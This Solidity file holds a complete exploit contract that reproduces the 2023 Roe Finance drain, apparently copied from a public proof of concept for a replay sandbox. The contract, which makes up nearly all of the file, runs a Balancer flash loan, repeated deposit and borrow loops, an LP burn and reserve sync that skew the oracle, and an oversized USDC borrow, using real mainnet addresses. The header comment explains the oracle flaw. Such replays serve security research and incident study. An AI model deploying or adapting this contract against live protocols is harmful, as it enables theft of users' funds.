// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-01-RoeFinance).
//
// The BlockSec PoC runs the attack INLINE in the Foundry `ContractTest` harness
// (the Balancer flash-loan callback `receiveFlashLoan` lives on the test itself,
// and `testExploit()` runs as Foundry's default `tx.origin` sender), so there is
// no standalone contract to deploy. This file is a faithful, self-contained copy
// of that inline attack (testExploit body + receiveFlashLoan callback +
// WBTCToUSDC helper + minimal inline interfaces — no imports so it compiles
// anywhere), compiled inside the registry forge project. Logic and constants are
// copied verbatim from test/RoeFinance_exp.sol. The one behavioral difference:
// the original's `LP.approveDelegation(address(this), max)` (called via
// `cheats.startPrank(tx.origin)`) is replicated as a pre-attack `setup.rawCall`
// step in the config instead of inline here, since it must run as the attacker
// EOA (tx.origin) BEFORE this contract is deployed/called.
//
// Root cause: Roe Finance is an Aave V2 fork whose variable-debt token for the
// WBTC/USDC Uniswap V2 LP market (vdWBTC_USDC_LP) uses the LP token's OWN spot
// balanceOf/totalSupply as its price oracle input (via a Chainlink-derived LP
// price feed that reads live reserves), instead of a manipulation-resistant
// value. The attacker flash-borrows USDC, deposits it plus repeatedly
// re-borrowed LP tokens into Roe to inflate their borrowing power, forcibly
// `burn()`s the pool's LP balance held by Roe's aToken (crashing totalSupply
// and letting the pool math be skewed), then borrows far more USDC than their
// real collateral is worth, converts the WBTC leg to USDC via Uniswap, and
// repays the flash loan — keeping the difference as profit.

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface Uni_Pair_V2 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function sync() external;
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ROE {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
}

contract RoeFinanceDrain {
    // The original PoC's `tx.origin` (Foundry's DefaultSender) — the identity that
    // approveDelegation'd its variable-debt credit line to this exploit contract
    // (see setup step below) and is used as `onBehalfOf` for the first
    // deposit/borrow pair, matching test/RoeFinance_exp.sol exactly.
    address constant TX_ORIGIN = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;

    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ROE roe = ROE(0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x004375Dff511095CC5A197A54140a24eFEF3A416);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address roeWBTC_USDC_LP = 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c;
    uint256 flashLoanAmount = 5_673_090_338_021;

    // step 0: flash-borrow USDC from Balancer; receiveFlashLoan does the drain.
    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;
        bytes memory userData = "";
        balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        uint256 borrowAmount = Pair.balanceOf(roeWBTC_USDC_LP);
        USDC.approve(address(roe), type(uint256).max);
        Pair.approve(address(roe), type(uint256).max);
        roe.deposit(address(USDC), USDC.balanceOf(address(this)), TX_ORIGIN, 0);
        roe.borrow(address(Pair), borrowAmount, 2, 0, TX_ORIGIN);
        for (uint256 i; i < 49; ++i) {
            roe.deposit(address(Pair), borrowAmount, address(this), 0);
            roe.borrow(address(Pair), borrowAmount, 2, 0, TX_ORIGIN);
        }
        Pair.transfer(address(Pair), borrowAmount);
        Pair.burn(address(this));
        USDC.transfer(address(Pair), 26_025 * 1e6);
        Pair.sync();
        roe.borrow(address(USDC), flashLoanAmount, 2, 0, address(this));
        WBTCToUSDC();
        USDC.transfer(address(balancer), flashLoanAmount);
    }

    function WBTCToUSDC() internal {
        WBTC.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(USDC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
